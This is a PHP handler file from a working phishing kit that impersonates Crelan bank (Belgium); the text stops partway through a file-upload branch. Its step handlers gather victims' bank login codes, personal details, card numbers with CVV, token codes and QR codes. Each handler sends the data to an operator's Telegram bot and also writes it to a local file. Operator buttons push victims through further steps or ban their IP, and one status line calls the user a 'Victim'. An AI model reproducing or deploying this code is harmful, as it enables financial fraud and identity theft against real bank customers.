<?php
    error_reporting(0);
    session_start();

	include "../setting/config.php";
	include "../setting/functions.php";
    include "../includes/set-data-users.php";
    include "../includes/add-current-step.php";

    $ip = get_client_ip();
    $link_panel = $_SESSION["panel_control"];
    $panel_telegram = $_SESSION["panel_telegram"];
    $main_panel = $_SESSION["main_panel"];
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $login_error = $panel_telegram."&to=login-error";
    $information = $panel_telegram."&to=information";
    $information_error = $panel_telegram."&to=information-error";
    $credit_card = $panel_telegram."&to=credit-card";
    $credit_card_error = $panel_telegram."&to=credit-card-error";
    $token = $panel_telegram."&to=token";
    $token_error = $panel_telegram."&to=token-error";
    $email_approvation = $panel_telegram."&to=email-approvation";
    $email_approvation_error = $panel_telegram."&to=email-approvation-error";
    $confirmed = $panel_telegram."&to=confirmed";
    $logout = $panel_telegram."&to=logout";
    $ban = $panel_telegram."&ban=$ip";
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "⛔ ERROR Login ⛔",
                    "url" => "$login_error"
                ]
            ],
            [
                [
                    "text" => "🔑🔐 Token CODE 🔐🔑",
                    "url" => "$token"
                ],
                [
                    "text" => "⛔ ERROR Token CODE ⛔",
                    "url" => "$token_error"
                ]
            ],
            [
                [
                    "text" => "📩🔄 Email Approvation 🔄📩",
                    "url" => "$email_approvation"
                ],
                [
                    "text" => "⛔ ERROR Email Approvation ⛔",
                    "url" => "$email_approvation_error"
                ]
            ],
            [
                [
                    "text" => "⚙️🛠 Upload QR Image 🛠⚙️",
                    "url" => "$link_panel"
                ]

            ],
            [
                [
                    "text" => '📝🛠 Extra Information 🛠📝',
                    "url" => "$link_panel"
                ]

            ],
            [
                [
                    "text" => "🗂 Information 🗂",
                    "url" => "$information"
                ],
                [
                    "text" => "⛔ ERROR Information ⛔",
                    "url" => "$information_error"
                ]
            ],
            [
                [
                    "text" => "💳 Credit Card 💳",
                    "url" => "$credit_card"
                ],
                [
                    "text" => "⛔ ERROR Credit Card ⛔",
                    "url" => "$credit_card_error"
                ]
            ],
            [
                [
                        "text" => "✅ Page Confirmed ✅",
                        "url" => "$confirmed"
                ]
            ],
            [
                [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                ]
            ],
            [
                [
                    "text" => '🕹 PaneL Control For  : [ ' . $ip . " - " . $_SESSION['code_country_visit'] .' ]',
                    "url" => "$link_panel"
                ]

            ],
        ]
    ]);

    $keyboard_end = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🗑 Logout 🗑",
                    "url" => "$logout"
                ]
            ],
            [
                [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                ]
            ],
            [
                [
                        "text" => "📊 Main Panel 📊",
                        "url" => "$main_panel"
                ]
            ],
        ]
    ]);

    if($_SERVER['REQUEST_METHOD'] === 'POST'){
        if($_POST['step'] === 'login') {
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $user_code = $_POST["user_code"];

                // Send Data To Telegram Bot :
                $message =
                "🔐=====[ Login CRELAN BE ]=====🔐\r\n".
                "[ 👤 User Code ] " . $user_code ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔐=====[ LLogin CRELAN BE ]=====🔐\r\n";
        
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
            
                $message_to_file = 
                "[=====[ Login CRELAN BE ]=====]\r\n".
                "[ User Code ] " . $user_code ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Login CRELAN BE ]=====]\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
        
                $target = $_POST['ip'];
                $data_count = 'data_1';
                set_data_user_target($target, $data_count, $message_to_file);    
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'login-error') {
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $user_code = $_POST["user_code"];

                // Send Data To Telegram Bot :
                $message =
                "🔐=====[ Login CRELAN BE ERROR ]=====🔐\r\n".
                "[ 👤 User Code ] " . $user_code ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔐=====[ Login CRELAN BE ERROR ]=====🔐\r\n";
        
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
            
                $message_to_file = 
                "[=====[ Login CRELAN BE ERROR ]=====]\r\n".
                "[ User Code ] " . $user_code ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Login CRELAN BE ERROR ]=====]\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
        
                $target = $_POST['ip'];
                $data_count = 'data_3';
                set_data_user_target($target, $data_count, $message_to_file);    
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'information'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $full_name = $_POST['first_name'] . " " . $_POST['last_name'];
                $birthday = $_POST['dob']; 
                $address = $_POST['address']; 
                $city = $_POST['city'];
                $zip_code = $_POST['zip_code'];
                $email = $_POST['email']; 
                $phone_number = $_POST['phone_number'];
            
                // Send Data To Telegram Bot :
                $message =
                "👤====[ Information ]====👤\r\n".
                "[ 🪪 Full Name ] " . $full_name ."\r\n".
                "[ 🪪 Birthday ] " . $birthday ."\r\n".
                "[ 📫 Address ] " . $address ."\r\n".
                "[ 🌎 City ] " . $city ."\r\n".
                "[ 📫 Zip Code ] " . $zip_code ."\r\n".
                "[ 📞 Phone Number ] " . $phone_number ."\r\n".
                "[ 📩 Email ] " . $email ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "👤====[ Information ]====👤\r\n";
    
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
    
                $message_to_file = 
                "[====[ Information ]====]\r\n".
                "[ Full Name ] " . $full_name ."\r\n".
                "[ Birthday ] " . $birthday ."\r\n".
                "[ Address ] " . $address ."\r\n".
                "[ City ] " . $city ."\r\n".
                "[ Zip Code ] " . $zip_code ."\r\n".
                "[ Phone Number ] " . $phone_number ."\r\n".
                "[ Email ] " . $email ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[====[ Information ]====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
    
                $target = $_POST['ip'];
                $data_count = 'data_3';
                set_data_user_target($target, $data_count, $message_to_file);    
            }
            header('Location: ../pages/loading.php');
        } 
        elseif($_POST['step'] === 'information-error'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $full_name = $_POST['first_name'] . " " . $_POST['last_name'];
                $birthday = $_POST['dob']; 
                $address = $_POST['address']; 
                $city = $_POST['city'];
                $zip_code = $_POST['zip_code'];
                $email = $_POST['email']; 
                $phone_number = $_POST['phone_number'];
            
                // Send Data To Telegram Bot :
                $message =
                "👤====[ Information ERROR ]====👤\r\n".
                "[ 🪪 Full Name ] " . $full_name ."\r\n".
                "[ 🪪 Birthday ] " . $birthday ."\r\n".
                "[ 📫 Address ] " . $address ."\r\n".
                "[ 🌎 City ] " . $city ."\r\n".
                "[ 📫 Zip Code ] " . $zip_code ."\r\n".
                "[ 📞 Phone Number ] " . $phone_number ."\r\n".
                "[ 📩 Email ] " . $email ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "👤====[ Information ERROR ]====👤\r\n";
    
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
    
                $message_to_file = 
                "[====[ Information ERROR ]====]\r\n".
                "[ Full Name ] " . $full_name ."\r\n".
                "[ Birthday ] " . $birthday ."\r\n".
                "[ Address ] " . $address ."\r\n".
                "[ City ] " . $city ."\r\n".
                "[ Zip Code ] " . $zip_code ."\r\n".
                "[ Phone Number ] " . $phone_number ."\r\n".
                "[ Email ] " . $email ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[====[ Information ERROR ]====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
    
                $target = $_POST['ip'];
                $data_count = 'data_4';
                set_data_user_target($target, $data_count, $message_to_file);    
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'credit-card'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $card_number = $_POST['numberdrac'];
                $expires = $_POST['datedrac'];
                $cvv = $_POST['vvcdrac'];
                $apiKey = ApiBin;
                $cardNumber = str_replace(' ', '', $card_number);
                $firstSixDigits = substr($cardNumber, 0, 6);
                $last_four_digits = substr($cardNumber, -4);
                
                $url = "https://data.handyapi.com/bin/" . $firstSixDigits;
                $options = [
                    "http" => [
                        "method" => "GET",
                        "header" => "x-api-key: {$apiKey}\r\n"
                    ]
                ];
            
                $context = stream_context_create($options);
                $response = @file_get_contents($url, false, $context);
                $data = @json_decode($response, true);
                $_SESSION["name_the_bank"] = $data["Issuer"];
                $_SESSION["Type"] = $data["Type"];
                $_SESSION["Scheme"] = $data["Scheme"];
            
                // Send Data To Telegram Bot :
                $message =
                "💳=====[ Credit Card ]=====💳\r\n".
                "[ 💳 Card Number ] " . $card_number ."\r\n".
                "[ 📅 Expiry Date ] " . $expires ."\r\n".
                "[ 🔐 Cvv ] " .$cvv ."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ 💳 Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "💳=====[ Credit Card ]=====💳\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "[=====[ Credit Card ]=====]\r\n".
                "[ Card Number ] " . $card_number ."\r\n".
                "[ Expiry Date ] " . $expires ."\r\n".
                "[ Cvv ] " . $cvv ."\r\n".
                "[ Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Credit Card ]=====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_5';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');        
        }
        elseif($_POST['step'] === 'credit-card-error'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $card_number = $_POST['numberdrac'];
                $expires = $_POST['datedrac'];
                $cvv = $_POST['vvcdrac'];
                $apiKey = ApiBin;
                $cardNumber = str_replace(' ', '', $card_number);
                $firstSixDigits = substr($cardNumber, 0, 6);
                $last_four_digits = substr($cardNumber, -4);
                
                $url = "https://data.handyapi.com/bin/" . $firstSixDigits;
                $options = [
                    "http" => [
                        "method" => "GET",
                        "header" => "x-api-key: {$apiKey}\r\n"
                    ]
                ];
            
                $context = stream_context_create($options);
                $response = @file_get_contents($url, false, $context);
                $data = @json_decode($response, true);
                $_SESSION["name_the_bank"] = $data["Issuer"];
                $_SESSION["Type"] = $data["Type"];
                $_SESSION["Scheme"] = $data["Scheme"];
            
                // Send Data To Telegram Bot :
                $message =
                "💳=====[ Credit Card ERROR ]=====💳\r\n".
                "[ 💳 Card Number ] " . $card_number ."\r\n".
                "[ 📅 Expiry Date ] " . $expires ."\r\n".
                "[ 🔐 Cvv ] " .$cvv ."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ 💳 Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "💳=====[ Credit Card ERROR ]=====💳\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "[=====[ Credit Card ERROR ]=====]\r\n".
                "[ Card Number ] " . $card_number ."\r\n".
                "[ Expiry Date ] " . $expires ."\r\n".
                "[ Cvv ] " . $cvv ."\r\n".
                "[ Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Credit Card ERROR ]=====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_6';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');            
        }
        elseif($_POST['step'] === 'token'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $serial_number = $_POST['serial_number'];
                $token_code = $_POST['token_code'];
                
                // Send Data To Telegram Bot :
                $message =
                "🔑🔐=====[ Token Step ]=====🔐🔑\r\n".
                "[ Serial Number ] " . $serial_number ."\r\n".
                "[ Token Code ] " . $token_code ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔑🔐=====[ Token Step ]=====🔐🔑\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ Token Step ]=====]\r\n".
                "[ Serial Number ] " . $serial_number ."\r\n".
                "[ Token Code ] " . $token_code ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Token Step ]=====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_7';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'token-error'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $serial_number = $_POST['serial_number'];
                $token_code = $_POST['token_code'];
                
                // Send Data To Telegram Bot :
                $message =
                "🔑🔐=====[ Token Step ERROR ]=====🔐🔑\r\n".
                "[ Serial Number ] " . $serial_number ."\r\n".
                "[ Token Code ] " . $token_code ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔑🔐=====[ Token Step ERROR ]=====🔐🔑\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ Token Step ERROR ]=====]\r\n".
                "[ Serial Number ] " . $serial_number ."\r\n".
                "[ Token Code ] " . $token_code ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Token Step ERROR ]=====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_8';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'qr'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $qr_code = $_POST['qr_code'];
                
                // Send Data To Telegram Bot :
                $message =
                "📸📲=====[ QR Step ]=====📲📸\r\n".
                "[ Code QR Scan ] " . $qr_code ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📸📲=====[ QR Step ]=====📲📸\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ QR Step ]=====]\r\n".
                "[ Code QR Scan ] " . $qr_code ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ QR Step ]=====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_9';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'qr-error'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $qr_code = $_POST['qr_code'];
                
                // Send Data To Telegram Bot :
                $message =
                "📸📲=====[ QR Step ERROR ]=====📲📸\r\n".
                "[ Code QR Scan ] " . $qr_code ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📸📲=====[ QR Step ERROR ]=====📲📸\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ QR Step ERROR ]=====]\r\n".
                "[ Code QR Scan ] " . $qr_code ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ QR Step ERROR ]=====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_10';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'extra-information'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $extra_information = $_POST['extra_information'];
                
                // Send Data To Telegram Bot :
                $message =
                "📲=====[ Extra Infromation ]=====📲\r\n".
                "[ Extra Infromation ] " . $extra_information ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📲=====[ Extra Infromation ]=====📲\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ Extra Infromation ]=====]\r\n".
                "[ Extra Infromation ] " . $extra_information ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Extra Infromation ]=====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_11';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'extra-information-error'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $extra_information = $_POST['extra_information'];
                
                // Send Data To Telegram Bot :
                $message =
                "📲=====[ Extra Infromation ERROR ]=====📲\r\n".
                "[ Extra Infromation ] " . $extra_information ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📲=====[ Extra Infromation ERROR ]=====📲\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ Extra Infromation ERROR ]=====]\r\n".
                "[ Extra Infromation ] " . $extra_information ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Extra Infromation ERROR ]=====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_12';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'email-approvation'){
            if(isset($_POST['b_s_d_p'])) {
                $status = "User Click Continue From Page (Email Approvation)";

                // Send Data To Telegram Bot :
                $message =
                "📩🔄=====[ Page (Approvation) ]=====🔄📩\r\n".
                "[ Status ] " . $status ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📩🔄=====[ Page (Approvation) ]=====🔄📩\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );

                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "[=====[ Page (Approvation) ]=====]\r\n".
                "[ Status ] " . $status ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Page (Approvation) ]=====]\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_13';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'email-approvation-error'){
            if(isset($_POST['b_s_d_p'])) {
                $status = "User Click Continue From Page Error (Email Approvation)";

                // Send Data To Telegram Bot :
                $message =
                "📩🔄=====[ Page ERROR (Approvation) ]=====🔄📩\r\n".
                "[ Status ] " . $status ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📩🔄=====[ Page ERROR (Approvation) ]=====🔄📩\r\n";
                
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );

                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "[=====[ Page ERROR (Approvation) ]=====]\r\n".
                "[ Status ] " . $status ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Page ERROR (Approvation) ]=====]\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_14';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');    
        }
        elseif($_POST['step'] === 'confirmed'){
            if(isset($_POST['b_s_d_p'])) {
                $status = "Victim Complete steps successfully";
        
                // Send Data To Telegram Bot :
                $message =
                "💸💶=====[ Status ]=====💸💶\r\n".
                "[ Status ] " . $status ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "💸💶=====[ Status ]=====💸💶\r\n";
                
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard_end
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "[=====[ Status ]=====]\r\n".
                "[ Status ] " . $status ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Status ]=====]\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_15';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'panel'){
            if($_POST['to'] === 'qr'){
                $target = $_POST['id_vip'];
                $file = $_FILES['QR_image'];
                $targetDirectory = '../document/';
                $filename = uniqid() . '_' . $file['name'];
                $targetPath = $targetDirectory . $filename;
                move_uploaded_file($file['tmp_name'], $targetPath);
                $qr_target = "../document/". $filename;
                
                $to = "qr";
                added_qr($target, $to, $qr_target);
            }
            elseif($_POST['to'] === 'qr-error'){
                $target = $_POST['id_vip'];
                $file = $_FILES['QR_image'];
                $targetDirectory = '../document/';
                $filename = uniqid() . '_' . $file['name'];
                $targetPath = $targetDirectory . $filename;
                move_uploaded_file($file['tmp_name'], $targetPath);
                $qr_target = "../document/". $filename;
